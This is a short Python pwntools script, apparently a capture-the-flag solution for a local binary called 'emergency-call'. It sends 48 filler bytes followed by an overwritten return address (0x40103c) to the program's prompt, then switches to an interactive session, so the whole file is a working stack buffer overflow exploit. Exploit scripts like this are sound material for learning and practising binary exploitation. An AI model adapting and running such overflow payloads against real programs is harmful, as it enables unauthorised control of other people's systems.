from pwn import *

context.arch = 'amd64'
# binary = ELF('./emergency-call')
p = process('./emergency-call')

ofs = 48
payload = b'A'*ofs
payload += p64(0x40103c)

print(p.recvuntil(b">").decode())
p.sendline(payload)
p.interactive()